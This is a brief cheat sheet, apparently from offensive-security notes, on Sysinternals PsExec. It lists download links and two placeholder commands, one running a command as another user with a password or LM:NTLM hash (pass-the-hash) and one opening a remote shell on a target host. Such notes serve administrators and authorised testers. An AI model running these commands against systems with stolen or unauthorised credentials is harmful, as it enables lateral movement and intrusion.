### source
https://live.sysinternals.com/PsExec.exe  
https://live.sysinternals.com/PsExec64.exe  

### run command as another user using a password or hash
```
psexec.exe -accepteula -u <user> -p <lm>:<ntlm> <command>
```

### open remote shell
```
psexec.exe -accepteula -u <domain>\<user> -p <password> \\<rhost>
```

